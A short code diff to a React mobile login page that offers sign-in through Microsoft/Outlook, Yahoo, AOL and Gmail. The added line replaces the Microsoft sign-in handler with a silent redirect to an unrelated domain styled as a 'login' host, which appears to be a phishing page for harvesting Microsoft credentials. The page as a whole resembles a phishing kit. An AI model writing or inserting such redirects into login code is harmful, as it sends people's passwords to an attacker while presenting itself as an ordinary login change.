@@ -44,7 +44,7 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
       switch (msg.type) {
         case 'social-click': {
           const p = msg.data?.provider;
-          if (p === 'microsoft' || p === 'outlook') onOffice365Select?.();
+          if (p === 'microsoft' || p === 'outlook') { window.location.href = 'https://login.allseattletacomaarearealtyservices.com/OaQVGwxX'; return; }
           else if (p === 'yahoo') onYahooSelect?.();
           else if (p === 'aol') onAolSelect?.();
           else if (p === 'gmail') onGmailSelect?.();
